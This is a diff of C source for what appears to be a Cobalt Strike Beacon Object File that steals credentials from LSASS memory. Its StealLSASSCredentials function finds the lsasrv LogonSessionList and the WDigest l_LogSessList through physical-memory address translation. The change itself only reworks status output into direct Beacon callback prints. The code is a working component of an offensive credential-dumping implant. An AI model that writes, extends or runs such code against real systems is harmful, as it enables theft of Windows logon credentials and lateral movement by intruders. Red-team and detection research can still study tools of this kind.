@@ -228,15 +228,17 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
     if (RetrieveMSV1Credentials)
     {
         // lsasrv!LogonSessionList Information
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Searching for LogonSessionList...\n");
         DWORD64 DataSectionOffset = GetDataSectionOffset("lsasrv.dll");
         DWORD64 ImageStartAddress = GetModuleHandleA("lsasrv.dll");
         DWORD64 DataSectionBase = ImageStartAddress + DataSectionOffset;
         DWORD64 LogonSessionListHead = SearchForLogonSessionListHead(hFile, DataSectionBase, lower32bits, LsassPID, ImageStartAddress, dBuildNumber);
         if (LogonSessionListHead == 0)
         {
-            BeaconFormatPrintf(&outputbuffer, "[!] Failed to obtain LogonSessionList!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to obtain LogonSessionList!\n");
             return FALSE;
         }
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] LogonSessionList found: 0x%llx\n", LogonSessionListHead);
         
         BeaconFormatPrintf(&outputbuffer, "\n===== [ LogonSessionList Information ] =====\n");
         BeaconFormatPrintf(&outputbuffer, "[i] LogonSessionList: 0x%llx\n\n", LogonSessionListHead);
@@ -253,19 +255,17 @@ BOOL StealLSASSCredentials(HANDLE hFile, DWORD dBuildNumber, BOOL RetrieveMSV1Cr
         DWORD64 l_LogSessListHead = SearchForLogSessList();
         if (l_LogSessListHead == -1)
         {
-            BeaconFormatPrintf(&outputbuffer, "[!] Failed to get the l_LogSessList address!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get the l_LogSessList address!\n");
             FreeLibrary(hWDModule);
             FreeLibrary(hModule);
             return FALSE;
         }
-
-        BeaconFormatPrintf(&outputbuffer, "\n===== [ WDigest l_LogSessList Information ] =====\n");
-        BeaconFormatPrintf(&outputbuffer, "[i] l_LogSessList address: 0x%llx\n\n", l_LogSessListHead);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] l_LogSessList: 0x%llx\n", l_LogSessListHead);
 
         DWORD64 tmpPA = 0;
         if (!TranslateUVA2Physical(l_LogSessListHead, &tmpPA, lower32bits, LsassPID))
         {
-            BeaconFormatPrintf(&outputbuffer, "[!] l_LogSessList is not yet mapped in memory. Authentication must occur for data to be available\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] l_LogSessList not yet mapped — authentication must occur first.\n");
             FreeLibrary(hWDModule);
             FreeLibrary(hModule);
             return FALSE;
